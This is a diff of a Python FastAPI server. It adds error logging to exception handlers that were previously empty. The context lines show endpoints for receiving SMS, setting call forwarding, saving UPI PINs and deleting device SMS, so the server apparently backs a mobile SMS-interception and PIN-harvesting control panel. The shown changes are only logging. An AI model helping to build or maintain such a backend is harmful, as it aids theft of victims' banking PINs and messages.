@@ -102,7 +102,7 @@ async def device_heartbeat(request: Request):
         return {"success": True, "message": "Heartbeat received"}
         
     except Exception as e:
-
+        logger.error(f"Operation failed: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/ping-response")
@@ -121,7 +121,7 @@ async def ping_response(request: Request):
         return {"success": True, "message": "Ping response received"}
         
     except Exception as e:
-
+        logger.error(f"Operation failed: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/upload-response")
@@ -165,7 +165,7 @@ async def upload_response(request: Request):
         return {"success": True, "message": "Upload response received"}
         
     except Exception as e:
-
+        logger.error(f"Operation failed: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/register")
@@ -322,7 +322,7 @@ async def receive_sms(request: Request):
     except HTTPException:
         raise
     except Exception as e:
-
+        logger.error(f"Operation failed: {e}")
         raise HTTPException(
             status_code=500,
             detail=f"Internal server error: {str(e)}"
@@ -337,7 +337,7 @@ async def get_forwarding_number_new(device_id: str):
             return {"forwardingNumber": ""}
         return {"forwardingNumber": forwarding_number}
     except Exception as e:
-
+        logger.error(f"Operation failed: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.get("/health")
@@ -763,7 +763,7 @@ async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
         )
     
     except Exception as e:
-
+        logger.error(f"Operation failed: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.get("/auth/me", response_model=AdminResponse)
@@ -1482,6 +1482,8 @@ async def update_device_settings(
             f"Device: {device_id}, Changes: {', '.join(settings_dict.keys())}"
         )
     except Exception as e:
+        logger.error(f"Operation failed: {e}")
+        raise
 
     await device_service.add_log(device_id, "settings", "Settings updated", "info", settings_dict)
 
@@ -1515,6 +1517,8 @@ async def delete_device_sms(
             f"Deleted {result.deleted_count} SMS messages from device {device_id}"
         )
     except Exception as e:
+        logger.error(f"Operation failed: {e}")
+        raise
 
     return {
         "success": True,
@@ -1569,7 +1573,7 @@ async def get_device_calls(
         }
 
     except Exception as e:
-
+        logger.error(f"Operation failed: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
     return {
